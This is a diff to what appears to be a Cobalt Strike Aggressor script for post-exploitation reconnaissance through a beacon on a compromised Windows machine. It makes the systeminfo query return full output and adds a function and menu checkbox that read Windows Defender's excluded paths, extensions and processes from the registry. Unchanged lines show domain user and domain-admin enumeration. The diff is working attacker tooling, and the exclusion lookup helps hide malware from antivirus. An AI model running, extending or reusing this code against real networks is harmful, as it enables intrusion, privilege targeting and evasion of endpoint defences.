@@ -4,7 +4,7 @@ local('$bid');
 
 sub sysinfo{
     btask($bid, "=====Systeminfo=====", "");
-    bshell($bid, "systeminfo | findstr /B /C:\"OS\"");
+    bshell($bid, "systeminfo");
 }
 
 sub ipconfig{
@@ -82,6 +82,16 @@ sub domain{
     bshell($bid, "net user /domain && wmic useraccount get /all && dsquery user && net group \"domain admins\" /domain");
 }
 
+sub defender{
+    btask($bid, "=====Defender exclusions info=====");
+    btask($bid, "Exclusions Paths");
+    breg_query($bid, "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths", "x64");
+    btask($bid, "Exclusions Extensions");
+    breg_query($bid, "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Extensions", "x64");
+    btask($bid, "Exclusions Processes");
+    breg_query($bid, "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Processes", "x64");
+}
+
 sub main{
     foreach $func (keys($3)){
         if ($3[$func] eq 'true'){
@@ -156,6 +166,7 @@ sub main{
             drow_checkbox($dialog, "proxy", "System proxy configuration information", "");
             drow_checkbox($dialog, "chistory", "Cmd & Powershell history", "");
             drow_checkbox($dialog, "recent", "Recent history", "");
+            drow_checkbox($dialog, "defender", "Defender info", "");
             drow_checkbox($dialog, "domain", "Domain informations", "");
             drow_file($dialog, "automatic", "Use automatic script: ");
             drow_text($dialog, "redirect", "Script output file[optional]: ");
